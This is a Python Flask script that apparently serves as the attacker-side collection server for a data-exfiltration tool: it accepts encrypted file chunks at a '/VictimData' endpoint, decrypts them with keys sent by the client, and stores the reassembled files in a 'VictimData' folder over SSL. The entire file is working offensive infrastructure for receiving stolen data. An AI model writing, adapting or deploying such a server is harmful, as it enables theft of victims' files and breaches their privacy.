from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import os
import base64
import logging
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "VictimData"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
keys = {}
received_chunks = {}

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    WHITE = "\033[97m"
    RESET = "\033[0m"

logging.basicConfig(filename="server.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def log_and_print(message, level="info"):
    print(message)
    getattr(logging, level, logging.info)(message)

@app.route("/VictimData", methods=["POST"])
def upload_file():
    if "file" not in request.files or "key" not in request.form:
        log_and_print(f"{Colors.RED}[ERROR] Missing file or key in request!{Colors.RESET}", "warning")
        return jsonify({"error": "Missing file or key"}), 400

    file = request.files["file"]
    file_name = file.filename
    total_size = int(request.form.get("total_size", 0))
    file_key = request.form["key"]
    file_path = os.path.join(UPLOAD_FOLDER, file_name)

    if file_name not in received_chunks:
        received_chunks[file_name] = 0
    received_chunks[file_name] += 1
    received_chunks_count = received_chunks[file_name]

    encrypted_data = file.read()
    chunk_size = len(encrypted_data)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_and_print(f"""{Colors.WHITE}
---------------------------------------------------
                   FILE CHUNK RECEIVED
---------------------------------------------------
| File Name      : {file_name}
| Received Time  : {timestamp}
| Received Chunks: {received_chunks_count}
| Chunk Size     : {chunk_size} bytes
| Total Size     : {total_size} bytes
---------------------------------------------------{Colors.RESET}
""", "info")

    if file_name not in keys:
        keys[file_name] = base64.urlsafe_b64decode(file_key)
        log_and_print(f"{Colors.WHITE}[KEY STORED] Key stored for file: {file_name}{Colors.RESET}", "info")

    cipher = Fernet(keys[file_name])
    try:
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, "ab") as f:
            f.write(decrypted_data)
        log_and_print(f"{Colors.GREEN}[SUCCESS] Chunk decrypted and written successfully{Colors.RESET}", "info")
    except Exception as e:
        log_and_print(f"{Colors.RED}[ERROR] Decryption failed for {file_name}: {e}{Colors.RESET}", "error")
        return jsonify({"error": "Decryption failed"}), 500

    current_size = os.path.getsize(file_path)
    if current_size >= total_size:
        log_and_print(f"""{Colors.GREEN}
---------------------------------------------------
                  FILE UPLOAD COMPLETE
---------------------------------------------------
| File Name  : {file_name}
| Total Size : {current_size} bytes
| Status     : Decryption Successfully Completed
---------------------------------------------------{Colors.RESET}
""", "info")

    return jsonify({"message": "Chunk received"}), 200

if __name__ == "__main__":
    log_and_print(f"{Colors.WHITE}Server starting on port 5000 with SSL enabled...{Colors.RESET}", "info")
    app.run(host="0.0.0.0", port=5000, ssl_context=("cert.pem", "key.pem"))
